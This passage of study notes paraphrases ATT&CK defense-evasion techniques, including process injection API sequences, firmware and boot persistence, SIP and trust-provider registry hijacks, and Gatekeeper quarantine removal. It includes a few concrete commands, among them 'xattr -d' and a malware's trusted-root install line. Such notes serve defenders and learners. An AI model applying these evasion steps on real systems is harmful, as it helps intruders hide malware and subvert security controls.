An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring VM or data storage snapshots through the cloud management dashboard or cloud APIs

Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM

<br>
<hr>

# Modify Registry
Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.

Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API
* Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence

Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access
* The built-in Windows command-line utility Reg may be used for local or remote Registry modification
* Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API
* The Registry of a remote system may be modified to aid in execution of files as part of lateral movement
  * It requires the remote Registry service to be running on the target system
  * Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication

<br>
<hr>

# Modify System Image
Adversaries may make changes to the OS of embedded network devices to weaken defenses and provide new capabilities for themselves. On such devices, the OSs are typically monolithic and most of the device functionality and capabilities are contained within a single file.

To change the OS, the adversary typically only needs to affect this one file, replacing or modifying it
* This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device

<br>

## Patch System Image
Some network devices are built with a monolithic architecture, where the entire OS and most of the functionality of the device is contained within a single file
* Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime

To change the OS in storage, the adversary will typically use the standard procedures available to device operators; This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection
* The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image

To change the OS in memory, the adversary typically can use one of two methods

1. Make use of native debug commands in the original, unaltered running OS that allow them to directly modify the relevant memory addresses containing the running OS
* This method typically requires administrative level access to the device

2. Make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the OS
* Adversaries may use malicious code previously implanted in the boot loader, such as through the `ROMMONkit method`, to directly manipulate running OS code in memory
* This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live OS during runtime.

By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before
* Examples of existing defenses that can be impeded include encryption, via Weaken Encryption, authentication, via Network Device Authentication, and perimeter defenses, via Network Boundary Bridging
* Adding new capabilities for the adversary’s purpose include Keylogging, Multi-hop Proxy, and Port Knocking

Adversaries may also compromise existing commands in the OS to produce false output to mislead defenders
* When this method is used in conjunction with Downgrade System Image, one example of a compromised system command may include changing the output of the command that shows the version of the currently running OS
* By patching the OS, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade

When the OS is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via TFTP Boot

When the technique is performed on the running OS in memory and not on the stored copy, this technique will not survive across reboots
* However, live memory modification of the OS can be combined with `ROMMONkit` to achieve persistence

<br>

## Downgrade System Image
Adversaries may install an older version of the OS of a network device to weaken security. Older OS versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features

On embedded devices, downgrading the version typically only requires replacing the OS file in storage
* With most embedded devices, this can be achieved by downloading a copy of the desired version of the OS file and reconfiguring the device to boot from that file on next system restart
* The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts

Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as *Weaken Encryption*
* Downgrading of a system image can be done on its own, or it can be used in conjunction with *Patch System Image*

<br>
<hr>

# Network Boundary Bridging
Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.

Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks; They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections via IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications
* To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised

When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance
* By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as C2 via Multi-hop Proxy or exfiltration of data via Traffic Duplication
* Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with Internal Proxy to achieve the same goals
  * In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments

<br>

## Network Address Translation Traversal
NAT works by rewriting the source and/or destination addresses of the IP address header. Adversaries may bridge network boundaries by modifying a network device’s NAT configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks


When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design
* In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device
* In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders

Adversaries may use *Patch System Image* to change the OS of a network device, implementing their own custom NAT mechanisms to further obscure their activities

<br>
<hr>

# Obfuscated Files or Information
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit

Payloads may be compressed, archived, or encrypted in order to avoid detection
* Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution
* The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary
* Adversaries may also used compressed or archived scripts, such as JavaScript


Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery
* Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled

Adversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter
* Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms

<br>

## Binary Padding
Adversaries may use binary padding to add junk data and change the on-disk representation of malware
* This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations

**Binary Padding** effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static AV signatures
* The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware

Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files
* This may also reduce the likelihood of being collected for analysis
* Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed

<br>

## Software Packing
**Software Packing:** A method of compressing or encrypting an executable
* Packing an executable changes the file signature in an attempt to avoid signature-based detection
* Most decompression techniques decompress the executable code in memory
* VM software protection translates an executable's original code into a special format that only a special VM can run; A VM is then called to run this code

Adversaries may perform software packing or virtual machine software protection to conceal their code
* **Packers:** Utilities used to perform software packing
  * Example packers are MPRESS and UPX
  * A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses

<br>

## Steganography
Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files
* Adversaries may use steganography techniques in order to prevent the detection of hidden information


By the end of 2017, a threat group used `Invoke-PSImage` to hide PowerShell commands in an image file (.png) and execute the code on a victim's system
* In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary

<br>

## Compile After Delivery
Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries
* These payloads will need to be compiled before execution; typically via native utilities such as `csc.exe` or `GCC/MinGW`
* Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code

Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phish
* Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework 

<br>

## Indicator Removal from Tools
Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems

A good example of this is when malware is detected with a file signature and quarantined by anti-virus software
* An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware

<br>

## HTML Smuggling
HTML documents can store large binary objects known as *JavaScript Blobs* (immutable data that represents raw bytes) that can later be constructed into file-like objects
* Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents
* HTML5 also introduced a download attribute that may be used to initiate file downloads 

Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files
* Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes
  
Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as text/plain and/or text/html
* Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. Deobfuscate/Decode Files or Information), potentially bypassing content filters

JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as *msSaveBlob*

<hr>

# Plist File Modification
macOS applications use property list files, such as `info.plist` file, to store properties and configuration settings that inform the OS how to handle the application at runtime
* Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD
* Plist files can be saved in text or binary format

Adversaries may modify plist files to enable other malicious activity, while also potentially evading and bypassing system defense

Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. Hidden Window) or running additional commands for persistence (ex: Launch Agent/Launch Daemon or Re-opened Applications)

Attackers can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock
* Adversaries can also modify the `LSUIElement` key in an application’s `info.plist` file to run the app in the background
* Adversaries can also insert key-value pairs to insert environment variables, such as `LSEnvironment`, to enable persistence via Dynamic Linker Hijacking 

<br>
<hr>

# Pre-OS Boot
Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the OS. These programs control flow of execution before the OS takes control 

Adversaries may overwrite data in boot drivers or firmware such as BIOS / UEFI to persist on systems at a layer below the OS. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses

<br>

## System Firmware
BIOS, UEFI, or EFI are examples of system firmware that operate as the software interface between the OS and hardware of a computer
* Adversaries may modify system firmware to persist on systems

<br>

## Component Firmware
Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the OS and main system firmware or BIOS
* This technique may be similar to *System Firmware* but conducted upon other system components/devices that may not have the same capability or level of integrity checking

Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks

<br>

## Bootkit
**Bootkit:** A malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR)
* The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS -- It is the location of the boot loader
* Bootkits reside at a layer below the OS and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly
  
An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code
* The MBR passes control of the boot process to the VBR
* An adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code

<br>

## ROMMONkit
**ROMMON** A Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset
* An adversary may upgrade the ROMMON image locally or remotely with adversary code and restart the device in order to overwrite the existing ROMMON image
* This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect

Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect 

<br>

## TFTP Boot
**TFTP boot (netbooting)** is commonly used by network administrators to load configuration-controlled network device images from a centralized management server
* **Netbooting** is one option in the boot sequence and can be used to centralize, manage, and control device images
  * Adversaries may abuse netbooting to load an unauthorized network device OS
 from a TFTP server

Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with *Modify System Image* to load a modified image on device startup or reset
* The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality
* This technique is similar to ROMMONkit and may result in the network device running a modified image

<br>
<hr>

# Process Injection
**Process Injection:** A method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges
* Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process

Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel

<br>

## Dynamic-link Library Injection
**DLL Injection:** A method of executing arbitrary code in the address space of a separate live process
* Commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread
* The write can be performed with native Windows API calls such as `VirtualAllocEx` and `WriteProcessMemory`, then invoked with `CreateRemoteThread` (which calls the `LoadLibrary` API responsible for loading the DLL)

Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of LoadLibrary)

<br>

## Portable Executable Injection
PE Injection: A method of executing arbitrary code in the address space of a separate live process

PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread
* The write can be performed with native Windows API calls such as `VirtualAllocEx` and `WriteProcessMemory`, then invoked with `CreateRemoteThread` or additional code
* The displacement of the injected code does introduce the additional requirement for functionality to remap memory references

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process

<br>

## Thread Execution Hijacking
Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process

Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL
* A handle to an existing victim process is first created with native Windows API calls such as `OpenThread`
  * At this point the process can be suspended then written to, realigned to the injected code, and resumed via `SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread` respectively

**Note:** This is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.

<br>

## Asynchronous Procedure Call
**APC Injection:** A method of executing arbitrary code in the address space of a separate live process

Queued APC functions are executed when the thread enters an alterable state
* A handle to an existing victim process is first created with native Windows API calls such as `OpenThread`
* At this point `QueueUserAPC` can be used to invoke a function (such as `LoadLibrayA` pointing to a malicious DLL)
* APC injection is commonly performed by attaching malicious code to the APC Queue of a process's thread

A variation of APC injection, dubbed "Early Bird injection", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC
* **AtomBombing** is another variation that utilizes APCs to invoke malicious code previously written to the global atom table

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.

<br>

## Thread Local Storage
Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.

TLS callback injection involves manipulating pointers inside a PE to redirect a process to malicious code before reaching the code's legitimate entry point
* TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads
* Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other Process Injection techniques such as Process Hollowing

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process

<br>

## Ptrace System Calls
Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.

The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values
Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: malloc) then invoking that memory with `PTRACE_SETREGS` to set the register containing the next instruction to execute
* Ptrace system call injection can also be done with `PTRACE_POKETEXT/PTRACE_POKEDATA`, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction)

Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.s

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.

<br>

## Proc Memory
**Proc Memory Injection:** A method of executing arbitrary code in the address space of a separate live process

Adversaries may inject malicious code into processes via the `/proc` filesystem in order to evade process-based defenses as well as possibly elevate privileges

* Proc Memory Injection involves enumerating the memory of a process via the `/proc` filesystem `/proc/[pid]` then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings
* Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem
  * This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR)
  * Once enumerated, the target processes’ memory map within `/proc/[pid]/maps` can be overwritten using `dd`

Other techniques such as Dynamic Linker Hijacking may be used to populate a target process with more available gadgets. Similar to Process Hollowing, proc memory injection may target child processes (such as a backgrounded copy of sleep).

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.

<br>

## Extra Window Memory Injection
EWM Injection: A method of executing arbitrary code in the address space of a separate live process

**PRETEXT:**
Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle I/O of data)
* Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class
* This EWM is intended to store data specific to that window and has specific API functions to set and get its value

The EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.

Writing payloads to shared sections also avoids the use of highly monitored API calls such as `WriteProcessMemory` and `CreateRemoteThread`
* More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process

<br>

## Process Hollowing
Process hollowing is a method of executing arbitrary code in the address space of a separate live process

Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code
* A victim process can be created with native Windows API calls such as `CreateProcess`, which includes a flag to suspend the processes primary thread
* At this point the process can be unmapped using APIs calls such as `ZwUnmapViewOfSection` or `NtUnmapViewOfSection` before being written to, realigned to the injected code, and resumed via `VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread` respectively

Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. 


**NOTE:** This is very similar to Thread Local Storage but creates a new process rather than targeting an existing process
* This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process
* However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process

<br>

## Process Doppelganging
**Process Doppelgänging** A method of executing arbitrary code in the address space of a separate live process

Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. 

Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. 

Adversaries may abuse TxF to a perform a file-less variation of Process Injection
* Similar to Process Hollowing, process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. 

**Process Doppelgänging is implemented in 4 steps:**

1. Transact -- Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction
2. Load -- Create a shared section of memory and load the malicious executable.
3. Rollback -- Undo changes to original executable, effectively removing malicious code from the file system
4. Animate –- Create a process from the tainted section of memory and initiate execution
   
This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.

<br>

## VDSO Hijacking
**Virtual Dynamic Shared Object (VDSO) Hijacking:** A method of executing arbitrary code in the address space of a separate live process

VDSO hijacking involves redirecting calls to dynamically linked shared libraries
* Memory protections may prevent writing executable code to a process via Ptrace System Calls
* However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object
  * This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.

<br>

## ListPlanting
**ListPlanting:** A method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process

List-view controls are user interface windows used to display collections of items
* Information about an application's list-view settings are stored within the process' memory in a *SysListView32* control

ListPlanting (a form of message-passing "shatter attack") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items
* Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the *SysListView32* child of the victim process window (via Windows API calls such as *FindWindow* and/or *EnumWindows*) or other Process Injection methods

Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored `WriteProcessMemory` function
* An adversary can use the `PostMessage` and/or `SendMessage` API functions to send `LVM_SETITEMPOSITION and LVM_GETITEMPOSITION` messages, effectively copying a payload 2 bytes at a time to the allocated memory

Finally, the payload is triggered by sending the `LVM_SORTITEMS` message to the *SysListView32* child of the process window, with the payload within the newly allocated buffer passed and executed as the `ListView_SortItems` callback

<br>

# Reflective Code Loading
**Reflective Loading:** Involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk
* Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode)

**NOTE::** Reflective Code Injection is very similar to Process Injection except that the "injection" loads code into the processes’ own memory instead of that of a separate process
* Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process
* Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution

<br>
<hr>

# Rogue Domain Controller
**DCShadow:** A method of manipulating AD data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC
* Adversaries may register a rogue DC to enable manipulation of AD data
  * Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys


### Registering a rogue DC
* Create a new server and `nTDSDSA` objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the `KRBTGT` hash

* This technique may bypass system logging and security monitors since actions taken on a rogue DC may not be reported to these sensors
* The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis
* Adversaries may also utilize this technique to perform `SID-History Injection` and/or manipulate AD objects to establish backdoors for Persistence 

<br>
<hr>

# Rootkit
**Rootkits:** Programs that hide the existence of malware by intercepting/hooking and modifying OS API calls that supply system information
* Rootkits or rootkit enabling functionality may reside at the user or kernel level in the OS or lower, to include a hypervisor, Master Boot Record, or System Firmware

<br>
<hr>

# Subvert Trust Controls
OS and security products may contain mechanisms to identify programs or websites as possessing some level of trust
* Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs
* The method adversaries use will depend on the specific mechanism they seek to subvert
* Adversaries may conduct File and Directory Permissions Modification or Modify Registry in support of subverting these controls
* Adversaries may also create or steal code signing certificates to acquire trust on target systems

<br>

## Gatekeeper Bypass
When documents, applications, or programs are downloaded an extended attribute *xattr* called `com.apple.quarantine` can be set on the file by the application performing the download. This attribute, also known as a **Quarantine Flag**, is read by Apple's Gatekeeper defense program when the file is run and provides a prompt to the user to allow or deny execution

Gatekeeper also monitors an application's usage of dynamic libraries (dylibs) loaded outside the application folder on any quarantined binary, often using the `dlopen` function
* If the quarantine flag is set in macOS 10.15+, Gatekeeper also checks for a notarization ticket and sends a cryptographic hash to Apple's servers to check for validity for all unsigned executables
  * Adversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls in macOS

The quarantine flag is an opt-in system and not imposed by macOS. If an application opts-in, a file downloaded from the Internet will be given a quarantine flag before being saved to disk
* Any application or user with write permissions to the file can change or strip the quarantine flag
* With sudo, this attribute can be removed from any file
* The presence of the `com.apple.quarantine` Quarantine Flag can be checked with the *xattr* command `xattr -l /path/to/examplefile`
  * Similarly, this attribute can be recursively removed from all files in a folder using xattr, `sudo xattr -d com.apple.quarantine /path/to/folder`

Apps and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the `curl` command do not set this flag
* Additionally, it is possible to avoid setting this flag using Drive-by Compromise, which may bypass Gatekeeper

<br>

## Code Signing
**Code Signing:** Provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. The certificates used during an operation may be created, acquired, or stolen by the adversary
* Unlike Invalid Code Signature, this activity will result in a valid signature
  * Adversaries may create, acquire, or steal code signing materials to sign their malware or tools

Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems -- It is not used on Linux due to the decentralized nature of the platform

Code signing certificates may be used to bypass security policies that require signed code to execute on a system.

<br>

## SIP and Trust Provider Hijacking
In user mode, Windows Authenticode digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code
* The signature validation process is handled via the `WinVerifyTrust` API function, which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a *signature.f*

Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks


Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) to provide a layer of abstraction between API functions and files
* SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures
* Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all) and are identified by globally unique identifiers (GUIDs)

Similar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system
* Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious  code as signed by: 

* Modifying the Dll and *FuncName* Registry values in `HKLM\SOFTWARE[\WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg{SIP_GUID}` that point to the dynamic link library (DLL) providing a SIP’s `CryptSIPDllGetSignedDataMsg` function, which retrieves an encoded digital certificate from a signed file
  * By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature
    * Attackers can apply an acceptable signature value to all files using that SIP (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file)
  
* Modifying the Dll and *FuncName* Registry values in `HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData{SIP_GUID}` that point to the DLL providing a SIP’s `CryptSIPDllVerifyIndirectData` function, which validates a file’s computed hash against the signed hash value
  * By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (with or without hijacking the previously mentioned *CryptSIPDllGetSignedDataMsg* function)
    * This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk
  
* Modifying the DLL and Function Registry values in `HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\Providers\Trust\FinalPolicy{trust provider GUID}` that point to the DLL providing a trust provider’s *FinalPolicy* function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made
  * Similar to hijacking SIP’s *CryptSIPDllVerifyIndirectData* function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex)

Note: The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking


Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation 

<br>

## Install Root Certificate
**Root Certificates:** Used in public key cryptography to identify a root CA. When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate
* Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers


Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. 

A typical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide Adversary-in-the-Middle capability for intercepting information transmitted over secure TLS/SSL communications. 

Root certificates and their associated chains can also be cloned and reinstalled
* Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence

### In macOS
Ay MaMi malware uses `/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert` to install a malicious certificate as a trusted root certificate into the system keychain

<br>

## Mark-of-the-Web Bypass
Attackers may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls


### In Windows
